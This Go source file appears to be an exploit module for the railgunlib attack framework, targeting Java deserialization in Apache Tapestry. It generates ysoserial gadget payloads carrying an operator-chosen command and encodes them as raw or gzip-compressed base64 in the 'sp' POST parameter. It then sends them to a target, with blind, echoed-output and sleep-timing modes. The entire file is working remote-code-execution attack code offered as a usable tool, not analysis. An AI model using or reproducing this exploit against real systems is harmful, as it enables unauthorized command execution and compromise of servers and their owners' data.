package exp_Tapestry

import (
	"encoding/base64"
	"github.com/lz520520/railgunlib/pkg/gadgets"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/code_invoke"
	"github.com/lz520520/railgunlib/pkg/templates/code_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"time"
)

type Exp_sp struct {
	exp_templates.ExpTemplate
}

// #####################编码转换模块生成#########################
func GzipEncode(src string) (dst string, err error) {
	codeParams := []code_model.CodeParams{

		{
			CodeType: "char",
			CodeName: "Gzip",
			CodeMode: "Encode",
			CodeOptions: []code_model.CodeOption{

				{
					KeyName: "level",
					Value:   "DefaultCompression",
				},
			},
		},
	}
	return code_invoke.CodeInvoke(src, codeParams)
}

// #####################编码转换模块生成#########################

func (self *Exp_sp) Attack_check() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")

	headers := self.GetInitExpHeaders()
	payload := gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), cmd)
	SerializableAdaptor := self.MustGetStringParam("SerializableAdaptor")
	POST := self.MustGetStringParam("POST")
	exppayload := ""
	if SerializableAdaptor == "O" {
		exppayload = POST + "&sp=O" + url.QueryEscape(base64.StdEncoding.EncodeToString(payload))
	} else if SerializableAdaptor == "Z" {
		exppayload, _ = GzipEncode(string(payload))
		exppayload = POST + "&sp=Z" + url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(exppayload)))
	}
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, exppayload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Status = true
	self.EchoInfoMsg("无回显，自行检查")
	return
}

func (self *Exp_sp) Attack_echocmd() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")

	headers := self.GetInitExpHeaders()
	self.AddEncodeCmdHeader(headers, cmd)
	payload := gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), cmd)
	SerializableAdaptor := self.MustGetStringParam("SerializableAdaptor")
	POST := self.MustGetStringParam("POST")
	exppayload := ""
	if SerializableAdaptor == "O" {
		exppayload = POST + "&sp=O" + url.QueryEscape(base64.StdEncoding.EncodeToString(payload))
	} else if SerializableAdaptor == "Z" {
		exppayload, _ = GzipEncode(string(payload))
		exppayload = POST + "&sp=Z" + url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(exppayload)))
	}
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, exppayload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoDebugMsg(httpresp.Resp.Header.Get("Transfer-encoded"))

	if self.CheckRespHeader(httpresp.Resp.Header) {
		expResult.Status = true
		// 解码响应数据
		result, err := self.ParserEncodeCmdResult(httpresp.Body)
		if err != nil {
			expResult.Err = err.Error()
			return
		}
		self.EchoInfoMsg(result)
	} else {
		self.EchoErrMsg("利用失败")
	}

	return
}

func (self *Exp_sp) subSleep() (err error) {
	headers := self.GetInitExpHeaders()
	payload := gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), "")
	SerializableAdaptor := self.MustGetStringParam("SerializableAdaptor")
	POST := self.MustGetStringParam("POST")
	exppayload := ""
	if SerializableAdaptor == "O" {
		exppayload = POST + "&sp=O" + url.QueryEscape(base64.StdEncoding.EncodeToString(payload))
	} else if SerializableAdaptor == "Z" {
		exppayload, _ = GzipEncode(string(payload))
		exppayload = POST + "&sp=Z" + url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(exppayload)))
	}
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, exppayload, headers)
	if httpresp.Err != nil {
		err = httpresp.Err
		return
	}
	return
}

func (self *Exp_sp) Attack_sleep() (expResult exp_model.ExpResult) {
	expResult.Status, _ = self.CheckGagdetWithSleep(self.subSleep, 10*time.Second)
	return
}

func init() {

	exp_register.ExpStructRegister(&Exp_sp{}, "exp_sp.yml")

}
